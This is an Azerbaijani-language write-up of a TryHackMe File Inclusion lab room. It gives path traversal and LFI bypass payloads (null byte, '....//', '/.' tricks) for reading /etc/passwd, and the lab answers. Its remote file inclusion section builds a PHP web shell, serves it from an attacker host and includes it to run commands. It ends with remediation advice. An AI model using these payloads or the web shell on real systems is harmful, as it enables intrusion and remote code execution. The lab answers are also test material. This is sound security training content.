# TryHackMe — File Inclusion Room Writeup

> Bu writeup həm konseptləri öyrənmək, həm də lab həllərini tapmaq üçündür.
> Hər bölmədə: **nə baş verir → niyə işləyir → payload**

---

## Path Traversal vs LFI — Fərq nədir?

**Path Traversal:** Server faylı oxuyub raw məzmunu sənə göndərir. Yəni `/etc/passwd`-ı oxuyursan, içindəki mətn sənə gəlir, o qədər.

**Local File Inclusion (LFI):** Server faylı `include()` kimi bir funksiyadan keçirir. Bu o deməkdir ki, əgər faylın içində PHP kodu varsa, server həmin kodu **icra edir**. Bu səbəbdən LFI çox daha təhlükəlidir — düzgün şərtlər olsa uzaqdan kod icrasına (RCE) çevrilə bilər.

PHP-də LFI yaradan əsas funksiyalar bunlardır:
```
include()
require()
include_once()
require_once()
```

---

## Lab #1 — Ən Sadə LFI

### Nə baş verir?

Developer belə bir kod yazıb:

```php
include($_GET["lang"]);
```

User-dən gələn `lang` parametrini **heç bir yoxlama olmadan** birbaşa `include()` funksiyasına verir. Yəni sən nə yazsan, o onu açmağa çalışır.

### Necə exploit edirik?

Heç bir qovluq prefiksi yoxdur, heç bir filter yoxdur. Birbaşa mütləq yol (absolute path) veririk:

```
http://10.82.184.147/lab1.php?file=/etc/passwd
```

Server `/etc/passwd` faylını tapır, `include()` ilə icra edir (PHP kodu olmadığı üçün sadəcə məzmunu göstərir) və sənə qaytarır.

### Cavab

```
/lab1.php?file=/etc/passwd
```

---

## Lab #2 — Qovluq Prefiksi Var

### Nə baş verir?

Developer bu dəfə bir az ehtiyatlı olmaq istəyib:

```php
include("languages/" . $_GET['lang']);
```

Input-un önünə `languages/` əlavə edir ki, yalnız həmin qovluqdakı fayllar açılsın. Amma yenə də user input-unu filtrsiz birbaşa istifadə edir.

### Qovluğu necə tapırıq?

Əvvəlcə mövcud olmayan bir dəyər veririk:
```
?file=THM
```

Server error verir:
```
Warning: include(languages/THM): failed to open stream...
```

Bu error bizə iki şey deyir:
1. Qovluq `languages/` dir
2. Extension əlavə edilmir (`.php` yoxdur)

### Necə exploit edirik?

`../` ardıcıllığı ilə qovluqdan çıxırıq. `/var/www/html/THM-2/` kimi bir yerdə olduğumuzu düşünsək, 4 dəfə yuxarı qalxmaq kifayətdir:

```
?file=../../../../etc/passwd
```

Server bunu belə görür:
```
languages/../../../../etc/passwd
→ /etc/passwd  ✅
```

### Cavab

```
/lab2.php?file=../../../../etc/passwd
```

---

## Lab #3 — Null Byte Bypass

### Nə baş verir?

Server input-un sonuna avtomatik `.php` əlavə edir:

```php
include("languages/" . $_GET['lang'] . ".php");
```

Biz `../../../../etc/passwd` yazsaq, server:
```
languages/../../../../etc/passwd.php
```
axtarır. Belə bir fayl yoxdur, xəta verir.

### Necə bypass edirik?

**Null byte (`%00`)** istifadə edirik. Null byte C proqramlaşdırma dilindən gəlir — string-in sonu kimi qəbul edilir. PHP-nin `include()` funksiyası arxada C kitabxanalarından istifadə etdiyi üçün, `%00`-dan sonra gələn hər şeyi (o cümlədən `.php`-ni) **görməz**.

```
?file=../../../../etc/passwd%00
```

Server bunu belə eşidir:
```
languages/../../../../etc/passwd   ← .php görünmür
```

> ⚠️ Bu hiylə PHP 5.3.4 versiyasında patch edilib. Yalnız köhnə sistemlərdə işləyir.

### Cavab

```
/lab3.php?file=../../../../etc/passwd%00
```

---

## Lab #4 — Keyword Filter Bypass

### Nə baş verir?

Server `/etc/passwd` sözünü axtarır və görəndə bloklayr. Birbaşa yazsaq keçmir.

### Necə bypass edirik?

Fayl sisteminin `.` (cari qovluq) simvolunu istifadə edirik. `/etc/passwd/.` yazdıqda:
- **Filter:** `/etc/passwd` axtarır → tam uyğun gəlmir → keçirir ✅
- **Fayl sistemi:** `/etc/passwd/.` → "passwd faylının cari qovluğu" → eyni fayl ✅

Alternativ olaraq null byte də işləyə bilər:
```
/etc/passwd%00
```

### Cavab

```
/lab4.php?file=/etc/passwd/.
```

---

## Lab #5 — `../` Stripping Bypass

### Nə baş verir?

Server input-dan `../` ardıcıllığını tapıb silir. Biz `../../../../etc/passwd` yazsaq, server `../` hissələrini çıxarır:

```
../../../../etc/passwd  →  etc/passwd  ❌
```

### Necə bypass edirik?

**Double sequence** texnikası: `../`-i elə bir şəkildə gizlədirik ki, siləndən sonra arxasında yenə `../` qalsın.

`....//` yazırıq. Filter içindəki `../`-i silir:
```
....//  →  sil ../  →  ../  ✅
```

Yəni hər `....//` silinəndən sonra bir `../` yaranır. Buna görə:

```
....//....//....//....//etc/passwd
```

Silinmə prosesindən sonra:
```
../../../../etc/passwd  ✅
```

### Cavab

```
/lab5.php?file=....//....//....//....//etc/passwd
```

---

## Lab #6 — Məcburi Qovluq Prefiksi

### Nə baş verir?

Server input-un mütləq müəyyən bir qovluqla başlamasını tələb edir. Əgər başlamırsa, rədd edir.

### Qovluğu necə tapırıq?

Sadəcə test edirik:
```
?file=THM
```

Server deyir:
```
Access Denied! Allowed files at THM-profile folder only!
```

Deməli məcburi qovluq `THM-profile` dir.

### Necə exploit edirik?

Input-un əvvəlinə `THM-profile/` yazırıq ki, server keçirsin. Sonra `../` ilə həmin qovluqdan çıxıb hədəf fayla gedirik:

```
?file=THM-profile/../../../../../etc/os-release
```

Server yoxlayır: `THM-profile/` ilə başlayır? → Bəli, keçir ✅
Fayl sistemi: `THM-profile/../../../../../etc/os-release` → `/etc/os-release` ✅

### `/etc/os-release`-dən VERSION_ID

Fayl açıldıqdan sonra içində görəcəksən:
```
VERSION_ID="22.04"
```

### Cavab

```
/lab6.php?file=THM-profile/../../../../../etc/os-release
```

**VERSION_ID = `22.04`**

---

## Remote File Inclusion (RFI)

### LFI-dən fərqi nədir?

LFI-də biz serverin **özündəki** faylları icra etdiririk. RFI-də isə serveri **bizim serverimizə** müraciət etdiririk — oradan zərərli faylı gətirib icra etdirir. Bu o deməkdir ki, serverdə əvvəlcədən heç nə yükləməyə ehtiyac yoxdur.

### Tələb nədir?

PHP konfiqurasiyasında bu parametrlər aktiv olmalıdır:
```ini
allow_url_fopen = On
allow_url_include = On
```
Çox PHP quraşdırmalarında bunlar default olaraq aktivdir.

### Attack addımları

**1. Öz serverində zərərli fayl yarat (AttackBox-da):**
```bash
echo '<?PHP echo shell_exec($_GET["cmd"]); ?>' > /tmp/shell.php
cd /tmp
python3 -m http.server 8000
```

**2. URL-i inject et:**
```
http://10.82.184.147/playground.php?file=http://10.82.122.42:8000/shell.php
```

**3. Komanda icra et:**
```
?file=http://10.82.122.42:8000/shell.php&cmd=id
```

Cavab olaraq serverə `uid=...` kimi bir şey gələcək — bu o deməkdir ki, server sənin kodunu icra etdi.

### RFI-nin nəticələri

- **RCE** — Uzaqdan kod icrası (ən kritik)
- **Reverse Shell** — Serverə tam giriş
- **XSS** — Zərərli skript inject etmə
- **DoS** — Xidməti dayandırma

---

## Challenge Metodologiyası

Hər yeni challenge-ə başlayanda bu sıranı izlə:

**1. Entry point tap**
Yalnız URL-də deyil, bunlarda da axtarılmalıdır:
- URL parametrləri: `?file=`, `?lang=`, `?page=`
- POST body (Burp Suite lazımdır)
- Cookie dəyərləri
- HTTP header-lar

**2. Normal davranışı öyrən**
Düzgün bir dəyər ver, nə qaytardığına bax.

**3. Error çıxart**
```
?file=THM
```
Error mesajı adətən açıqlayır:
- Hansı qovluq prepend edilir
- Extension əlavə edilib-edilmədiyini
- Tam server yolunu (`/var/www/html/...`)

**4. Filter müəyyən et**
- `../` silinir? → `....//` işlət
- Extension əlavə olunur? → `%00` sına
- Keyword bloklanır? → `/.` əlavə et
- Məcburi qovluq? → Onunla başla

**5. Burp Suite işlət**
POST parametrləri və cookie-ləri browser-dən deyişmək olmur. Burp Suite-də intercept edib manual deyiş.

---

## Bypass Texnikaları — Tam Xülasə

| Problem | Texnika | Nümunə |
|---|---|---|
| Filter yoxdur | Birbaşa yol | `/etc/passwd` |
| Qovluq prefiksi var | `../` ilə çıx | `../../../../etc/passwd` |
| `.php` avtomatik əlavə olunur | Null byte | `../../../../etc/passwd%00` |
| Keyword bloklanır | Cari qovluq simvolu | `/etc/passwd/.` |
| `../` silinir | Double sequence | `....//....//etc/passwd` |
| Məcburi qovluq | Qovluqla başla, sonra çıx | `THM-profile/../../../../../etc/passwd` |

---

## Müdafiə (Remediation)

### Düzgün kod nədir?

```php
// ❌ Pis — user input filtrsiz
include($_GET['lang']);

// ✅ Yaxşı — allowlist ilə
$allowed = [
    'en' => 'languages/EN.php',
    'ar' => 'languages/AR.php'
];
$lang = $_GET['lang'] ?? 'en';
if (array_key_exists($lang, $allowed)) {
    include($allowed[$lang]);
}
```

İstifadəçi heç vaxt fayl yolunu birbaşa idarə edə bilmir.

### PHP konfiqurasiyası

```ini
allow_url_fopen = Off      # RFI-ni tamamilə bağlayır
allow_url_include = Off    # Uzaq fayl daxiletməni söndürür
display_errors = Off       # Error mesajlarını istifadəçidən gizlədir
log_errors = On            # Errorları server log-una yazır
```

### Xülasə

| Tədbir | Nəyi önləyir |
|---|---|
| Allowlist validasiyası | Path traversal, LFI |
| `allow_url` Off | RFI tamamilə |
| Error mesajları gizlət | Hücumçu server strukturunu öyrənə bilmir |
| Software yenilə | Null byte kimi köhnə exploitlər |
| WAF qur | Avtomatik skaner hücumları |
